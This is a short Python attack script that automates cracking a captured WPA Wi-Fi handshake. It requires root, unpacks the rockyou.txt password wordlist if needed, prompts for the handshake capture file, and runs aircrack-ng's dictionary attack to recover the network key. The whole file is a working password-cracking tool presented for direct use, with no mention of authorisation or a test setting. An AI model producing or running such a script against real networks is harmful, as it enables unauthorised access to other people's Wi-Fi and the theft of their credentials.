#!/usr/bin/env python3

import subprocess
import os

def unzip_rockyou():
    if not os.path.exists("/usr/share/wordlists/rockyou.txt"):
        if os.path.exists("/usr/share/wordlists/rockyou.txt.gz"):
            print("Unzipping rockyou.txt.gz...")
            subprocess.run(["gunzip", "/usr/share/wordlists/rockyou.txt.gz"])
        else:
            print("rockyou.txt.gz not found. Make sure it's in /usr/share/wordlists/")
            exit(1)

def crack_handshake(handshake_file):
    print("Cracking the handshake...")
    subprocess.run(["aircrack-ng", handshake_file, "-w", "/usr/share/wordlists/rockyou.txt"])


def main():
    if os.getuid() != 0:
        print("This script must be run as root.")
        return
    handshake_file = input("Enter the path to the handshake file (.cap): ")

    if not os.path.exists(handshake_file):
        print("Handshake file not found!")
        exit(1)

    unzip_rockyou()
    crack_handshake(handshake_file)

if __name__ == "__main__":
    main()
